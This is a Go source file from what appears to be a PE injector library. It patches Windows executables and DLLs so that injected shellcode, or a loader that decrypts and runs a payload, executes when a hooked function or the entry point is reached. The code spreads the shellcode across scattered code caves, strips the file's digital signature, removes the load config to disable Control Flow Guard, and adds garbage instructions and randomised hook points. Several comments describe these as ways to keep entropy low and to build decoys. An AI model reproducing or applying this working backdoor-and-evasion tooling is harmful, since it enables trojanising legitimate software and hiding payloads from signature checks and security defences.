package injector

import (
	"bytes"
	cr "crypto/rand"
	"debug/pe"
	"encoding/binary"
	"errors"
	"fmt"
	"math/rand"
	"strings"
	"time"

	"github.com/For-ACGN/go-keystone"
	"golang.org/x/arch/x86/x86asm"
)

// support modes:
//
// [code cave]
//   The Loader and Payload are all injected to code caves in .text section.
//   It will only change the .text section content, not adjust the size.
//   This is the most recommended mode, but enough code caves are needed.
//
// [code cave with new section]
//   The Loader is injected to code caves in .text section.
//   The Payload is written to a new read-only section at the tail of image.
//   It will only change the .text section content, not adjust the size.
//   This is the next recommended mode, only enough code caves for loader.
//
// [extend text section]
//   Injector will try to extend .text section for write Loader and Payload.
//   It will change the .text section content and adjust the size.
//   {NOTICE}
//   Extend text section maybe failed, so it is common recommended mode.
//   The Payload must be small(1 KB), otherwise it will make the entropy of
//   the .text section too high, if Payload is too large, use the next mode.
//
// [extend text section with new section]
//   Injector will try to extend .text section for write Loader.
//   The Payload is written to a new read-only section at the tail of image.
//   It will change the .text section content and adjust the size.
//   {NOTICE}
//   Extend text section maybe failed, so it is common recommended mode.
//
// [create text section]
//   The Loader and Payload are all injected to a new RX section at the tail
//   of image for test or decoy.
//   It will only change the .text section content, not adjust the size.
//   {NOTICE}
//   NOT use this mode in the actual scene except create decoy.

// these modes are used to display the mode that injector used.
const (
	ModeCodeCave     = "code-cave"
	ModeCodeCaveNS   = "code-cave_ns"
	ModeExtendText   = "extend-text"
	ModeExtendTextNS = "extend-text_ns"
	ModeCreateText   = "create-text"
)

var (
	// ImageBaseStub is used to mark the offset of the image base.
	ImageBaseStub = []byte{0x20, 0x25, 0x08, 0x21}

	// EndOfShellcode is used to mark the end of shellcode.
	// NOP DWORD ptr [EAX + EAX*1 + 00]
	EndOfShellcode = []byte{0x0F, 0x1F, 0x44, 0x00, 0x00}
)

// Injector is a simple PE injector for inject shellcode.
type Injector struct {
	rand *rand.Rand

	// assembler engine
	ase32 *keystone.Engine
	ase64 *keystone.Engine

	// context data
	opts *Options
	ctx  *Context
	arch string
	dll  bool
	size uint32
	abs  bool
	dup  []byte

	// about pe image
	img   *pe.File
	hdr32 *pe.OptionalHeader32
	hdr64 *pe.OptionalHeader64

	// about image alignment
	sectionAlign uint32
	fileAlign    uint32

	// about data directory
	numDataDir uint32
	dataDir    [16]pe.DataDirectory

	// common offset of image file
	offFileHdr uint32
	offOptHdr  uint32
	offDataDir uint32

	// restore before remove
	hasSignature  bool
	hasLoadConfig bool

	// about process EAT and IAT
	eat []*eat
	iat []*iat

	// about extend text section
	canTryExtendText bool
	extendTextSize   uint32

	// for insert garbage instruction
	igir *rand.Rand

	// record loader status for inject
	loaderSize uint32

	// about inject shellcode to section
	dstRVA uint32
	dstFOA uint32

	// about hook function
	oriInst [][]byte
	retRVA  uint32

	// about relocated shellcode
	segment    [][]byte
	contextSeq []int
	ccList     []*codeCave

	// for write shellcode segment
	caves []*codeCave

	// for select random register
	regBox []string
}

// Options contains options about inject shellcode.
type Options struct {
	// specify the target function address that will be hooked,
	// it is a Virtual Address, not a file offset or RVA.
	// remember disable ASLR when debug image.
	// if it is zero, use the entry point.
	Address uint64 `toml:"address" json:"address"`

	// specify the target function in EAT that will be hooked,
	// it not support forwarded function.
	Function string `toml:"function" json:"function"`

	// not hook any instruction in the text section for
	// inject raw instruction only, it is used to deploy
	// code for other advanced usage like shield stub.
	NoHookMode bool `toml:"no_hook_mode" json:"no_hook_mode"`

	// not append instruction about save and restore context.
	// if your shellcode need hijack function argument or some
	// register, you need set it with true.
	NotSaveContext bool `toml:"not_save_context" json:"not_save_context"`

	// not create thread at the shellcode,
	// ensure the shellcode can be called as a function.
	// on x86, the calling convention is stdcall.
	// if it is true, it will ignore the option NotWaitThread.
	// it is useless for method InjectRaw.
	NotCreateThread bool `toml:"not_create_thread" json:"not_create_thread"`

	// not wait created thread at the shellcode,
	// if it is true, it will ignore the option NotEraseShellcode.
	// it is useless for method InjectRaw.
	NotWaitThread bool `toml:"not_wait_thread" json:"not_wait_thread"`

	// not erase shellcode after execute finish.
	// when you need run shellcode as a background
	// program, you need set it with true.
	// it is useless for method InjectRaw.
	NotEraseShellcode bool `toml:"not_erase_shellcode" json:"not_erase_shellcode"`

	// not select a random instruction after target address
	// that can be hooked.
	// when Address is set or NotSaveContext, it will be ignored.
	NotFuzzHook bool `toml:"not_fuzz_hook" json:"not_fuzz_hook"`

	// not append garbage instruction to loader.
	// It is ignored when use modes about code cave.
	NoGarbageInst bool `toml:"no_garbage_inst" json:"no_garbage_inst"`

	// not add a shellcode jumper to call shellcode.
	// it is useless for method InjectRaw.
	NoShellcodeJumper bool `toml:"no_shellcode_jumper" json:"no_shellcode_jumper"`

	// calculate check sum after inject or extend image.
	CalculateCheckSum bool `toml:"calculate_check_sum" json:"calculate_check_sum"`

	// reserve load config data directory like enable Control Flow Guard.
	ReserveLoadConfig bool `toml:"reserve_load_config" json:"reserve_load_config"`

	// specify the new section name that will be created,
	// if it is empty, select one random name in defaultSectionNames.
	SectionName string `toml:"section_name" json:"section_name"`

	// specify a random seed for test and debug.
	RandSeed int64 `toml:"rand_seed" json:"rand_seed"`

	// force use ModeCodeCave for inject shellcode.
	ForceCodeCave bool `toml:"force_code_cave" json:"force_code_cave"`

	// force use ModeCodeCaveNS for inject shellcode.
	ForceCodeCaveNS bool `toml:"force_code_cave_ns" json:"force_code_cave_ns"`

	// force use ModeExtendText for inject shellcode.
	ForceExtendText bool `toml:"force_extend_text" json:"force_extend_text"`

	// force use ModeExtendTextNS for inject shellcode.
	ForceExtendTextNS bool `toml:"force_extend_text_ns" json:"force_extend_text_ns"`

	// force use ModeCreateText for inject shellcode.
	ForceCreateText bool `toml:"force_create_text" json:"force_create_text"`

	// specify the x86 loader template.
	LoaderX86 string `toml:"loader_x86" json:"loader_x86"`

	// specify the x64 loader template.
	LoaderX64 string `toml:"loader_x64" json:"loader_x64"`

	// specify the x86 junk code templates.
	JunkCodeX86 []string `toml:"junk_code_x86" json:"junk_code_x86"`

	// specify the x64 junk code templates.
	JunkCodeX64 []string `toml:"junk_code_x64" json:"junk_code_x64"`

	// specify highly customizable loader template.
	Template *Template `toml:"template" json:"template"`
}

// Context contains the output and context data in Inject and InjectRaw.
type Context struct {
	Output []byte `json:"output"`

	HookInst   string `json:"hook_inst"`
	LoaderHex  string `json:"loader_hex"`
	LoaderInst string `json:"loader_inst"`

	Arch string `json:"arch"`
	Type string `json:"type"`
	Size int64  `json:"size"`
	Raw  bool   `json:"raw"`
	Mode string `json:"mode"`
	Seed int64  `json:"seed"`

	SaveContext        bool   `json:"save_context"`
	CreateThread       bool   `json:"create_thread"`
	WaitThread         bool   `json:"wait_thread"`
	EraseShellcode     bool   `json:"erase_shellcode"`
	HasGarbageInst     bool   `json:"has_garbage_inst"`
	HasShellcodeJumper bool   `json:"has_shellcode_jumper"`
	SectionName        string `json:"section_name"`
	ExtendedSize       uint32 `json:"extended_size"`

	HasAllProcedures       bool `json:"has_all_procedures"`
	HasVirtualAlloc        bool `json:"has_virtual_alloc"`
	HasVirtualFree         bool `json:"has_virtual_free"`
	HasVirtualProtect      bool `json:"has_virtual_protect"`
	HasCreateThread        bool `json:"has_create_thread"`
	HasWaitForSingleObject bool `json:"has_wait_for_single_object"`
	HasLoadLibraryA        bool `json:"has_load_library_a"`
	HasLoadLibraryW        bool `json:"has_load_library_w"`
	HasGetProcAddress      bool `json:"has_get_proc_address"`

	NumCodeCaves  int    `json:"num_code_caves"`
	NumLoaderInst int    `json:"num_loader_inst"`
	NoHookMode    bool   `json:"no_hook_mode"`
	HookAddress   uint32 `json:"hook_address"`
	EntryAddress  uint32 `json:"entry_address"`
}

// NewInjector is used to create a simple PE injector.
func NewInjector() *Injector {
	var seed int64
	buf := make([]byte, 8)
	_, err := cr.Read(buf)
	if err == nil {
		seed = int64(binary.LittleEndian.Uint64(buf)) // #nosec G115
	} else {
		seed = time.Now().UTC().UnixNano()
	}
	injector := Injector{
		rand: rand.New(rand.NewSource(seed + 2018)), // #nosec
		igir: rand.New(rand.NewSource(seed + 4096)), // #nosec
	}
	return &injector
}

// Inject is used to inject a payload loader into PE image with multi modes,
// Loader will decrypt and execute or process the input payload.
func (inj *Injector) Inject(image, payload []byte, opts *Options) (*Context, error) {
	if len(payload) == 0 {
		return nil, errors.New("empty payload")
	}
	defer inj.cleanup()
	err := inj.preprocess(image, opts)
	if err != nil {
		return nil, err
	}
	// initialize keystone engine
	err = inj.initAssembler()
	if err != nil {
		return nil, fmt.Errorf("failed to initialize assembler: %s", err)
	}
	loader, err := inj.buildLoader(payload)
	if err != nil {
		return nil, fmt.Errorf("failed to build loader: %s", err)
	}
	err = inj.injectLoader(loader)
	if err != nil {
		return nil, fmt.Errorf("failed to inject loader: %s", err)
	}
	inj.overwriteCheckSum()
	inj.ctx.Output = inj.dup
	inj.ctx.Size = int64(len(inj.dup))
	inj.ctx.Raw = false
	// record loader assembly
	binHex, insts := inj.disassembleLoader(loader)
	inj.ctx.LoaderHex = binHex
	inj.ctx.LoaderInst = insts
	return inj.ctx, nil
}

// InjectRaw is used to inject shellcode into a PE image without loader.
// It is an advanced usage, ensure the shellcode not contain behaviors
// like read data from the shellcode tail.
// MUST use "nop 5" for set a flag that define the end of shellcode.
func (inj *Injector) InjectRaw(image []byte, shellcode []byte, opts *Options) (*Context, error) {
	if len(shellcode) == 0 {
		return nil, errors.New("empty shellcode")
	}
	defer inj.cleanup()
	err := inj.preprocess(image, opts)
	if err != nil {
		return nil, err
	}
	// initialize keystone engine
	err = inj.initAssembler()
	if err != nil {
		return nil, fmt.Errorf("failed to initialize assembler: %s", err)
	}
	// auto append the mark about end of shellcode
	if !bytes.Contains(shellcode, EndOfShellcode) && !inj.opts.NoHookMode {
		shellcode = bytes.Clone(shellcode)
		shellcode = append(shellcode, EndOfShellcode...)
	}
	_, err = inj.selectInjectRawMode(shellcode)
	if err != nil {
		return nil, err
	}
	err = inj.injectShellcode(shellcode)
	if err != nil {
		return nil, fmt.Errorf("failed to inject shellcode: %s", err)
	}
	inj.overwriteCheckSum()
	inj.ctx.Output = inj.dup
	inj.ctx.Size = int64(len(inj.dup))
	inj.ctx.Raw = true
	return inj.ctx, nil
}

// ExtendTextSection is used to try to extend text section.
// If extend successfully, it will return the extended image
// and the actual extended size.
func (inj *Injector) ExtendTextSection(image []byte, size uint32) ([]byte, uint32, error) {
	if size == 0 {
		return bytes.Clone(image), 0, nil
	}
	defer inj.cleanup()
	err := inj.preprocess(image, nil)
	if err != nil {
		return nil, 0, err
	}
	output, extended, err := inj.extendTextSection(size)
	if err != nil {
		return nil, 0, err
	}
	// preprocess again for overwrite checksum
	err = inj.preprocess(output, nil)
	if err != nil {
		return nil, 0, err
	}
	inj.overwriteCheckSum()
	return inj.dup, extended, nil
}

func (inj *Injector) injectLoader(loader []byte) (err error) {
	defer func() {
		if r := recover(); r != nil {
			err = errors.New(fmt.Sprint(r))
		}
	}()
	targetRVA, err := inj.selectHookTarget()
	if err != nil {
		return err
	}
	if targetRVA == 0 && !inj.opts.NoHookMode {
		return errors.New("hook target function address is zero")
	}
	targetRVA = inj.fuzzHook(targetRVA)
	first := inj.selectFirstCodeCave(targetRVA)
	var dstRVA uint32
	if inj.dstRVA != 0 {
		dstRVA = inj.dstRVA
	} else {
		if first == nil {
			return errors.New("not enough code caves for inject loader")
		}
		dstRVA = first.rva
	}
	err = inj.hook(targetRVA, dstRVA)
	if err != nil {
		return fmt.Errorf("failed to hook target function: %s", err)
	}
	err = inj.slice(loader, false)
	if err != nil {
		return err
	}
	if inj.dstRVA != 0 {
		inj.padding(loader, targetRVA)
		return nil
	}
	return inj.insert(targetRVA, first)
}

func (inj *Injector) injectShellcode(shellcode []byte) (err error) {
	defer func() {
		if r := recover(); r != nil {
			err = errors.New(fmt.Sprint(r))
		}
	}()
	targetRVA, err := inj.selectHookTarget()
	if err != nil {
		return err
	}
	if targetRVA == 0 && !inj.opts.NoHookMode {
		return errors.New("hook target function address is zero")
	}
	targetRVA = inj.fuzzHook(targetRVA)
	first := inj.selectFirstCodeCave(targetRVA)
	var dstRVA uint32
	if inj.dstRVA != 0 {
		dstRVA = inj.dstRVA
	} else {
		if first == nil {
			return errors.New("not enough code caves for inject shellcode")
		}
		dstRVA = first.rva
	}
	err = inj.hook(targetRVA, dstRVA)
	if err != nil {
		return fmt.Errorf("failed to hook target function: %s", err)
	}
	err = inj.slice(shellcode, true)
	if err != nil {
		return err
	}
	if inj.dstRVA != 0 {
		inj.padding(shellcode, targetRVA)
		return nil
	}
	return inj.insert(targetRVA, first)
}

func (inj *Injector) initAssembler() error {
	var err error
	switch inj.arch {
	case "386":
		if inj.ase32 != nil {
			return nil
		}
		inj.ase32, err = keystone.NewEngine(keystone.ARCH_X86, keystone.MODE_32)
		if err != nil {
			return err
		}
		return inj.ase32.Option(keystone.OPT_SYNTAX, keystone.OPT_SYNTAX_INTEL)
	case "amd64":
		if inj.ase64 != nil {
			return nil
		}
		inj.ase64, err = keystone.NewEngine(keystone.ARCH_X86, keystone.MODE_64)
		if err != nil {
			return err
		}
		return inj.ase64.Option(keystone.OPT_SYNTAX, keystone.OPT_SYNTAX_INTEL)
	default:
		panic("unreachable code")
	}
}

func (inj *Injector) assemble(src string) ([]byte, error) {
	if strings.Contains(src, "<no value>") {
		return nil, errors.New("invalid register in assembly source")
	}
	if strings.Contains(src, "<nil>") {
		return nil, errors.New("invalid usage in assembly source")
	}
	switch inj.arch {
	case "386":
		return inj.ase32.Assemble(src, 0)
	case "amd64":
		return inj.ase64.Assemble(src, 0)
	default:
		panic("unreachable code")
	}
}

func (inj *Injector) preprocess(image []byte, opts *Options) error {
	if opts == nil {
		opts = new(Options)
	}
	inj.opts = opts
	// parse pe image file
	peFile, err := pe.NewFile(bytes.NewReader(image))
	if err != nil {
		return err
	}
	// check is an executable image
	if peFile.Characteristics&pe.IMAGE_FILE_EXECUTABLE_IMAGE == 0 {
		return errors.New("not executable image")
	}
	// read image information
	isDLL := peFile.Characteristics&pe.IMAGE_FILE_DLL != 0
	var arch string
	switch peFile.Machine {
	case pe.IMAGE_FILE_MACHINE_I386:
		arch = "386"
		inj.hdr32 = peFile.OptionalHeader.(*pe.OptionalHeader32)
		inj.sectionAlign = inj.hdr32.SectionAlignment
		inj.fileAlign = inj.hdr32.FileAlignment
		inj.numDataDir = inj.hdr32.NumberOfRvaAndSizes
		inj.dataDir = inj.hdr32.DataDirectory
	case pe.IMAGE_FILE_MACHINE_AMD64:
		arch = "amd64"
		inj.hdr64 = peFile.OptionalHeader.(*pe.OptionalHeader64)
		inj.sectionAlign = inj.hdr64.SectionAlignment
		inj.fileAlign = inj.hdr64.FileAlignment
		inj.numDataDir = inj.hdr64.NumberOfRvaAndSizes
		inj.dataDir = inj.hdr64.DataDirectory
	default:
		return errors.New("unknown pe image architecture type")
	}
	inj.img = peFile
	inj.arch = arch
	inj.size = uint32(len(image)) // #nosec G115
	inj.dll = isDLL
	// set image type
	var typ string
	if isDLL {
		typ = imageTypeDLL
	} else {
		typ = imageTypeEXE
	}
	// calculate common offset of image file
	hdrOffset := binary.LittleEndian.Uint32(image[imageDOSHeader-4:])
	fileHeader := hdrOffset + imageNTSignatureSize
	optHeader := fileHeader + imageFileHeaderSize
	var optHeaderSize uint32
	switch inj.arch {
	case "386":
		optHeaderSize = imageOptionHeaderSize32
	case "amd64":
		optHeaderSize = imageOptionHeaderSize64
	}
	ddOffset := optHeader + optHeaderSize
	inj.offFileHdr = fileHeader
	inj.offOptHdr = optHeader
	inj.offDataDir = ddOffset
	err = inj.checkOptionConflict(opts)
	if err != nil {
		return err
	}
	// make duplicate for make output image
	inj.dup = bytes.Clone(image)
	// load image basic information
	err = inj.loadImage()
	if err != nil {
		return fmt.Errorf("failed to load image: %s", err)
	}
	// scan code cave in image text section
	caves, err := inj.scanCodeCave()
	if err != nil {
		return fmt.Errorf("failed to scan code cave: %s", err)
	}
	inj.caves = caves
	// remove the digital signature of the PE file
	inj.removeSignature()
	// remove the load config for disable Control Flow Guard
	inj.removeLoadConfig()
	// set random seed
	seed := opts.RandSeed
	if seed == 0 {
		seed = inj.rand.Int63()
	}
	inj.rand.Seed(seed)
	// update context
	inj.ctx = &Context{
		Arch: arch,
		Type: typ,
		Seed: seed,

		SaveContext:    !opts.NotSaveContext,
		CreateThread:   !opts.NotCreateThread,
		HasGarbageInst: !opts.NoGarbageInst,

		NumCodeCaves: len(caves),
		NoHookMode:   opts.NoHookMode,
	}
	return nil
}

func (inj *Injector) checkOptionConflict(opts *Options) error {
	if opts.Address != 0 && opts.Function != "" {
		return errors.New("both Address and Function are specified")
	}
	if opts.ReserveLoadConfig && !opts.NotCreateThread && !opts.NoShellcodeJumper {
		return errors.New("cannot create thread with shellcode jumper when reserve load config")
	}
	return nil
}

func (inj *Injector) selectHookTarget() (uint32, error) {
	if inj.opts.NoHookMode {
		return 0, nil
	}
	address := inj.opts.Address
	if address != 0 {
		// adjust address if extend text section
		address += uint64(inj.extendTextSize)
		inj.abs = true
		return inj.vaToRVA(address), nil
	}
	function := inj.opts.Function
	if function != "" {
		for _, eat := range inj.eat {
			if eat.proc == function {
				return eat.rva, nil
			}
		}
		return 0, fmt.Errorf("failed to find export function: %s", function)
	}
	if inj.dll {
		return 0, errors.New("must specify field Address or Function in DLL")
	}
	var entryPoint uint32
	switch inj.arch {
	case "386":
		entryPoint = inj.hdr32.AddressOfEntryPoint
	case "amd64":
		entryPoint = inj.hdr64.AddressOfEntryPoint
	}
	return entryPoint, nil
}

// select a random instruction after target address that can be hooked.
func (inj *Injector) fuzzHook(targetRVA uint32) uint32 {
	if inj.opts.NoHookMode {
		return 0
	}
	if inj.abs || inj.opts.NotFuzzHook || inj.opts.NotSaveContext {
		return targetRVA
	}
	// select a random instruction that can be hooked.
	num := 4 + inj.rand.Intn(40)
	foa := inj.rvaToFOA(targetRVA)
	target := foa
	for i := 0; i < num; i++ {
		if foa+32 > inj.size {
			break
		}
		inst, err := inj.decodeInst(inj.dup[foa : foa+32])
		if err != nil {
			break
		}
		// skip too small instructions for debug easily
		if inst.Len < nearJumpSize {
			foa += uint32(inst.Len)
			continue
		}
		// skip mov instruction for skip absolute address on x86
		if inst.Op == x86asm.MOV {
			foa += uint32(inst.Len)
			continue
		}
		// walk into the next instruction
		if inst.Op == x86asm.JMP {
			foa += uint32(inst.Len + int(inst.Args[0].(x86asm.Rel))) // #nosec G115
			continue
		}
		if inst.Op == x86asm.RET || inst.Op == x86asm.INT {
			break
		}
		// stop when reach a judgement jump
		if inst.PCRelOff != 0 {
			if inst.Op != x86asm.CALL {
				break
			}
			if inst.Len != 5 {
				break
			}
		}
		// set preselected target
		target = foa
		// decode next instruction
		foa += uint32(inst.Len)
	}
	return inj.foaToRVA(target)
}

// selectFirstCodeCave will try to search a cave near the target RVA.
func (inj *Injector) selectFirstCodeCave(target uint32) *codeCave {
	var first *codeCave
	for i, cave := range inj.caves {
		offset := int64(cave.rva) - int64(target)
		if offset <= 4096 && offset >= -4096 {
			first = cave
			inj.removeCodeCave(i)
			break
		}
	}
	// if failed to search target, random select a cave
	if first == nil && len(inj.caves) > 0 {
		i := inj.rand.Intn(len(inj.caves))
		first = inj.caves[i]
		inj.removeCodeCave(i)
	}
	return first
}

// hook target function for add a jmp to the first code cave
// #nosec G115
func (inj *Injector) hook(srcRVA uint32, dstRVA uint32) error {
	if inj.opts.NoHookMode {
		return nil
	}
	foa := inj.rvaToFOA(srcRVA)
	if foa+32 > inj.size {
		return errors.New("hook target is overflow")
	}
	insts, _ := inj.disassemble(inj.dup[foa : foa+32])
	numInst, totalSize, err := inj.calcInstNumAndSize(insts)
	if err != nil {
		return err
	}
	// backup original instruction that will be hooked
	var off uint32
	original := make([][]byte, numInst)
	for i := 0; i < numInst; i++ {
		original[i] = make([]byte, insts[i].Len)
		copy(original[i], inj.dup[foa+off:])
		off += uint32(insts[i].Len)
	}
	inj.oriInst = original
	// record the next instruction rva
	inj.retRVA = srcRVA + uint32(totalSize)
	// build a patch for jump to the first code cave
	jmp := make([]byte, nearJumpSize)
	jmp[0] = 0xE9
	rel := int64(dstRVA) - int64(srcRVA) - nearJumpSize
	binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
	padding := bytes.Repeat([]byte{0xCC}, totalSize-nearJumpSize)
	patch := make([]byte, 0, totalSize)
	patch = append(patch, jmp...)
	patch = append(patch, padding...)
	copy(inj.dup[foa:], patch)
	// update context
	inj.ctx.HookAddress = srcRVA
	return nil
}

// calcInstNumAndSize is used to calculate the number of the
// instruction and the total size that will be overwritten.
func (inj *Injector) calcInstNumAndSize(insts []*x86asm.Inst) (int, int, error) {
	var (
		num  int
		size int
	)
	for i := 0; i < len(insts); i++ {
		inst := strings.ToLower(insts[i].String())
		if inj.ctx.HookInst == "" {
			inj.ctx.HookInst = inst
		} else {
			inj.ctx.HookInst += "\r\n" + inst
		}
		num++
		size += insts[i].Len
		if size >= nearJumpSize {
			return num, size, nil
		}
	}
	return 0, 0, errors.New("unable to insert near jmp to this address")
}

// slice will disassemble shellcode and return a slice of instruction segment.
func (inj *Injector) slice(shellcode []byte, raw bool) error {
	insts, err := inj.disassemble(shellcode)
	if err != nil {
		return fmt.Errorf("failed to disassemble shellcode: %s", err)
	}
	var off int
	segments := make([][]byte, len(insts))
	for i := 0; i < len(insts); i++ {
		l := insts[i].Len
		segments[i] = make([]byte, l)
		copy(segments[i], shellcode[off:])
		off += l
	}
	inj.segment = segments
	// update context
	if !raw {
		inj.ctx.NumLoaderInst = len(segments)
	}
	return nil
}

// insert shellcode segment and the patched instruction to code caves.
// #nosec G115
func (inj *Injector) insert(targetRVA uint32, first *codeCave) error {
	saveContext := inj.saveContext()
	restoreContext := inj.restoreContext()
	num := len(saveContext) + len(restoreContext) + len(inj.segment) + len(inj.oriInst) + 4
	if num > len(inj.caves) {
		return errors.New("not enough code caves to inject shellcode")
	}
	current := first
	next := inj.selectCodeCave()
	// insert instruction about save context
	for i := 0; i < len(saveContext); i++ {
		inst := saveContext[i]
		size := uint32(len(inst))
		// build jmp instruction to next code cave
		rel := int64(next.rva) - int64(current.rva+size) - nearJumpSize
		jmp := make([]byte, nearJumpSize)
		jmp[0] = 0xE9
		binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
		rebuild := append([]byte{}, inst...)
		rebuild = append(rebuild, jmp...)
		current.Write(inj.dup, rebuild)
		// update status
		current = next
		next = inj.selectCodeCave()
	}
	// generate code cave list before insert for relocate instruction
	type item struct {
		current *codeCave
		next    *codeCave
	}
	list := make([]*item, len(inj.segment))
	ccLi := make([]*codeCave, len(inj.segment))
	for i := 0; i < len(inj.segment); i++ {
		list[i] = &item{
			current: current,
			next:    next,
		}
		ccLi[i] = current
		// update status
		current = next
		next = inj.selectCodeCave()
	}
	inj.ccList = ccLi
	// insert shellcode segment
	for i := 0; i < len(inj.segment); i++ {
		c := list[i].current
		n := list[i].next
		segment := inj.relocateSegment(inj.segment[i], i, c)
		size := uint32(len(segment))
		if size+nearJumpSize > uint32(c.size) {
			return errors.New("appear too large instruction in shellcode")
		}
		// check it is contained the image base stub
		if bytes.Contains(segment, ImageBaseStub) {
			addr := ccLi[i-2].rva + 5
			buf := make([]byte, 4)
			binary.LittleEndian.PutUint32(buf, addr)
			segment = bytes.ReplaceAll(segment, ImageBaseStub, buf)
		}
		// check it is the end of the shellcode
		if bytes.Equal(segment, EndOfShellcode) {
			if inj.opts.NoHookMode {
				ret := []byte{0xC3}
				c.Write(inj.dup, ret)
				continue
			}
			rel := int64(current.rva) - int64(c.rva) - nearJumpSize
			jmp := make([]byte, nearJumpSize)
			jmp[0] = 0xE9
			binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
			c.Write(inj.dup, jmp)
			continue
		}
		if inj.opts.NoHookMode && i == len(inj.segment)-1 {
			break
		}
		// build jmp instruction to next code cave
		rel := int64(n.rva) - int64(c.rva+size) - nearJumpSize
		jmp := make([]byte, nearJumpSize)
		jmp[0] = 0xE9
		binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
		rebuild := append([]byte{}, segment...)
		rebuild = append(rebuild, jmp...)
		c.Write(inj.dup, rebuild)
	}
	// insert instruction about restore context
	for i := 0; i < len(restoreContext); i++ {
		inst := restoreContext[i]
		size := uint32(len(inst))
		// build jmp instruction to next code cave
		rel := int64(next.rva) - int64(current.rva+size) - nearJumpSize
		jmp := make([]byte, nearJumpSize)
		jmp[0] = 0xE9
		binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
		rebuild := append([]byte{}, inst...)
		rebuild = append(rebuild, jmp...)
		current.Write(inj.dup, rebuild)
		// update status
		current = next
		next = inj.selectCodeCave()
	}
	// insert original instruction about patch
	var offTarget uint32
	for i := 0; i < len(inj.oriInst); i++ {
		inst := inj.extendInstruction(nil, inj.oriInst[i])
		size := uint32(len(inst))
		if size+nearJumpSize > uint32(current.size) {
			return errors.New("appear too large original instruction in patch")
		}
		// relocate instruction
		offset := int64(current.rva) - int64(targetRVA+offTarget)
		inst = inj.relocateInstruction(inst, offset)
		// build jmp instruction to next code cave or original instruction
		var rel int64
		if i != len(inj.oriInst)-1 {
			rel = int64(next.rva) - int64(current.rva+size) - nearJumpSize
		} else {
			rel = int64(inj.retRVA) - int64(current.rva+size) - nearJumpSize
		}
		jmp := make([]byte, nearJumpSize)
		jmp[0] = 0xE9
		binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
		rebuild := append([]byte{}, inst...)
		rebuild = append(rebuild, jmp...)
		current.Write(inj.dup, rebuild)
		// update status
		current = next
		next = inj.selectCodeCave()
		offTarget += uint32(len(inj.oriInst[i]))
	}
	// update context
	if inj.opts.NoHookMode {
		inj.ctx.EntryAddress = list[0].current.rva
	}
	return nil
}

// relocate shellcode instruction segment if it has PC-relative address.
// #nosec G115
func (inj *Injector) relocateSegment(segment []byte, idx int, current *codeCave) []byte {
	inst, err := inj.decodeInst(segment)
	if err != nil {
		panic(err)
	}
	if inst.PCRel == 0 {
		return segment
	}
	switch inst.Args[0].(type) {
	case x86asm.Rel:
	default:
		return segment
	}
	// calculate the target instruction in original shellcode
	var direction bool // true is after PC
	rel := int32(inst.Args[0].(x86asm.Rel))
	if rel >= 0 {
		direction = true
	}
	var (
		off int32
		dst int
	)
	if direction {
		for j := idx + 1; j < len(inj.segment); j++ {
			if off == rel {
				dst = j
				break
			}
			off += int32(len(inj.segment[j]))
		}
	} else {
		off += int32(inst.Len)
		for j := idx; j >= 0; j-- {
			if -off == rel {
				dst = j
				break
			}
			off += int32(len(inj.segment[j-1]))
		}
	}
	// extend instruction segment and decode
	segment = inj.extendInstruction(inst, segment)
	inst, err = inj.decodeInst(segment)
	if err != nil {
		panic(err)
	}
	// calculate the two code cave offset
	vDst := int64(inj.ccList[dst].rva)
	vSrc := int64(current.rva + uint32(inst.Len))
	offset := vSrc - vDst + int64(rel)
	// calculate the last offset and relocate instruction
	return inj.relocateInstruction(segment, offset)
}

// padding is used to padding the shellcode to the
// extended text section or created text section.
// #nosec G115
func (inj *Injector) padding(shellcode []byte, targetRVA uint32) {
	saveContext := mergeBytes(inj.saveContext())
	restoreContext := mergeBytes(inj.restoreContext())
	var oriInstOffset uint32
	oriInstOffset += uint32(len(saveContext))
	oriInstOffset += uint32(len(shellcode))
	oriInstOffset += uint32(len(restoreContext))
	// build final instructions
	insts := bytes.NewBuffer(make([]byte, 0, len(shellcode)+64))
	insts.Write(saveContext)
	// replace the end of shellcode to jmp to the tail of shellcode
	var scLen uint32
	for i := 0; i < len(inj.segment); i++ {
		segment := inj.segment[i]
		// check it is contained the image base stub
		if bytes.Contains(segment, ImageBaseStub) {
			addr := inj.dstRVA + uint32(len(saveContext)) + scLen
			addr -= uint32(len(inj.segment[i-1]))
			buf := make([]byte, 4)
			binary.LittleEndian.PutUint32(buf, addr)
			segment = bytes.ReplaceAll(segment, ImageBaseStub, buf)
		}
		// check it is the end of the shellcode
		if !bytes.Equal(segment, EndOfShellcode) {
			insts.Write(segment)
			scLen += uint32(len(segment))
			continue
		}
		if inj.opts.NoHookMode {
			ret := []byte{0xC3}
			pad := bytes.Repeat([]byte{0xCC}, len(EndOfShellcode)-1)
			ret = append(ret, pad...)
			insts.Write(ret)
			continue
		}
		offset := uint32(len(shellcode)) - scLen
		rel := offset - nearJumpSize
		// if the distance is zero, replace it to a nop5
		if rel != 0 {
			jmp := make([]byte, nearJumpSize)
			jmp[0] = 0xE9
			binary.LittleEndian.PutUint32(jmp[1:], rel)
			insts.Write(jmp)
		} else {
			nop5 := EndOfShellcode
			insts.Write(nop5)
		}
	}
	insts.Write(restoreContext)
	// write hooked original instruction
	var (
		offTarget uint32
		offInst   uint32
	)
	for i := 0; i < len(inj.oriInst); i++ {
		inst := inj.extendInstruction(nil, inj.oriInst[i])
		// relocate instruction
		current := int64(inj.dstRVA + oriInstOffset + offInst)
		offset := current - int64(targetRVA+offTarget)
		inst = inj.relocateInstruction(inst, offset)
		insts.Write(inst)
		offTarget += uint32(len(inj.oriInst[i]))
		offInst += uint32(len(inst))
	}
	// write jmp to the next original instruction
	if !inj.opts.NoHookMode {
		offset := inj.dstRVA + oriInstOffset + offInst
		rel := int64(inj.retRVA) - int64(offset) - nearJumpSize
		jmp := make([]byte, nearJumpSize)
		jmp[0] = 0xE9
		binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
		insts.Write(jmp)
	}
	// write instructions
	copy(inj.dup[inj.dstFOA:], insts.Bytes())
	// update context
	inj.ctx.EntryAddress = inj.dstRVA
}

func (inj *Injector) selectCodeCave() *codeCave {
	i := inj.rand.Intn(len(inj.caves))
	cave := inj.caves[i]
	inj.removeCodeCave(i)
	return cave
}

